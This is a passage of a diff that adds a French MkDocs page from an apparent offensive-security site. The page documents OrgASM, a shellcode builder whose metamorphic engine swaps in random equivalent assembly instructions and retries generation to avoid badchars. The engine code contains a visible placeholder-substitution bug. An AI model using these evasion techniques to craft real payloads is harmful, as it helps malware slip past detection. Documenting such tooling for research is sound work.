+                <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;mov &lt;reg1&gt;, 0&quot;</span><span class="p">],</span>
+                <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;sub &lt;reg1&gt;, &lt;reg1&gt;&quot;</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s2">&quot;64&quot;</span><span class="p">:</span> <span class="p">[</span>
+                <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;xor &lt;reg1&gt;, &lt;reg1&gt;&quot;</span><span class="p">],</span>
+                <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;mov &lt;reg1&gt;, 0&quot;</span><span class="p">],</span>
+                <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;sub &lt;reg1&gt;, &lt;reg1&gt;&quot;</span><span class="p">],</span>
+            <span class="p">]</span>
+        <span class="p">}</span>
+</code></pre></div>
+<p>Le moteur de métamorphisme, quant à lui, se contente de tenir la liste des plugins enregistrés et de les appeler en passant les valeurs depuis le template :</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="kn">from</span> <span class="nn">lib.exception</span> <span class="kn">import</span> <span class="n">MarkerNotFound</span>
+
+
+<span class="k">class</span> <span class="nc">MetaEngine</span><span class="p">:</span>
+
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;base&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">alterations</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">plugins</span> <span class="o">=</span> <span class="p">{}</span>
+
+    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">plugin</span><span class="p">):</span>
+        <span class="n">eng</span> <span class="o">=</span> <span class="n">plugin</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">plugins</span><span class="p">[</span><span class="n">eng</span><span class="o">.</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">eng</span>
+
+    <span class="k">def</span> <span class="nf">apply</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">arch</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">plugin</span> <span class="o">:=</span> <span class="bp">self</span><span class="o">.</span><span class="n">plugins</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">name</span><span class="p">)):</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Metamorphic plugin not found </span><span class="se">\&quot;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s2">&quot;&quot;</span>
+
+        <span class="k">return</span> <span class="n">plugin</span><span class="o">.</span><span class="n">get_random_alt</span><span class="p">(</span>
+            <span class="n">arch</span><span class="p">,</span>
+            <span class="n">reg1</span><span class="o">=</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;reg1&quot;</span><span class="p">),</span>
+            <span class="n">reg2</span><span class="o">=</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;reg2&quot;</span><span class="p">),</span>
+            <span class="n">val1</span><span class="o">=</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;val1&quot;</span><span class="p">),</span>
+            <span class="n">val2</span><span class="o">=</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;val2&quot;</span><span class="p">),</span>
+            <span class="n">val3</span><span class="o">=</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;val3&quot;</span><span class="p">),</span>
+            <span class="n">val4</span><span class="o">=</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;val4&quot;</span><span class="p">)</span>
+        <span class="p">)</span>
+</code></pre></div>
+<p>La fonction <code>get_random_alt</code> du plugin prend ensuite le relais et s'occupe de générer la ou les instructions à partir du template reçu :</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">random</span>
+
+<span class="kn">from</span> <span class="nn">lib.exception</span> <span class="kn">import</span> <span class="n">UnsupportedArch</span>
+
+
+<span class="k">class</span> <span class="nc">BasePlugin</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">alterations</span> <span class="o">=</span> <span class="p">{}</span>
+
+    <span class="k">def</span> <span class="nf">get_random_alt</span><span class="p">(</span>
+            <span class="bp">self</span><span class="p">,</span>
+            <span class="n">arch</span><span class="p">,</span>
+            <span class="n">reg1</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+            <span class="n">reg2</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+            <span class="n">val1</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+            <span class="n">val2</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+            <span class="n">val3</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+            <span class="n">val4</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
+    <span class="p">):</span>
+        <span class="n">alterations</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">alterations</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">arch</span><span class="p">))</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">alterations</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">UnsupportedArch</span>
+
+        <span class="n">rng</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">alterations</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">alt</span> <span class="o">=</span> <span class="n">alterations</span><span class="p">[</span><span class="n">rng</span><span class="p">]</span>
+
+        <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">alt</span><span class="p">):</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;reg1&gt;&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">reg1</span><span class="p">))</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;reg2&gt;&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">reg2</span><span class="p">))</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;val1&gt;&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val1</span><span class="p">))</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;val2&gt;&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val2</span><span class="p">))</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;val2&gt;&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val3</span><span class="p">))</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;val2&gt;&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val4</span><span class="p">))</span>
+            <span class="n">alt</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">line</span>
+
+        <span class="k">return</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">alt</span><span class="p">)</span>
+</code></pre></div>
+<p>Ces altérations sont choisies aléatoirement à chaque fois que le shellcode est généré. </p>
+<p>Il est possible, grâce à l'option <code>no_badchars</code>, de recommencer la génération jusqu'à ne plus détecté de de badchars présent (dans la limite de la valeur définie via l'option <code>badchars_max_loop</code>).</p>
+<h3 id="confort">Confort<a class="headerlink" href="#confort" title="Permanent link">#</a></h3>
+<p>Pour améliorer le confort lors de la création, de l'utilisation et du test de shellcode, OrgASM propose une vue détaillée reprenant un certain nombre d'informations pouvant s'avérer être utiles, telles que :</p>
+<ul>
+<li>La taille du shellcode</li>
+<li>Les badchars potentiellement présents</li>
+<li>La liste classée par ordre alphabétique des octets qui le composent, sans doublons</li>
+<li>Les hashs MD5, SHA1 et SHA256</li>
+</ul>
+<p><img alt="OrgASM Details" src="/assets/offsec/orgasm/media/details_options_run.png" /></p>
+<p>Lorsque l'option verbose est activée, le programme détaille les processus de compilation et d'exécution pour permettre de les reproduire dans un autre contexte.</p>
+<p><img alt="OrgASM Verbose Run" src="/assets/offsec/orgasm/media/run_verbose.png" /></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        <a href="../cti/" class="md-footer__link md-footer__link--prev" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Threat intelligence
+            </div>
+          </div>
+        </a>
+      
+      
+        <a href="../defsec/" class="md-footer__link md-footer__link--next" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Sécurité défensive
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}, "search": "../assets/javascripts/workers/search.fb4a9340.min.js", "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.a1c7c35e.min.js"></script>
+      
+    
+  </body>
+</html>
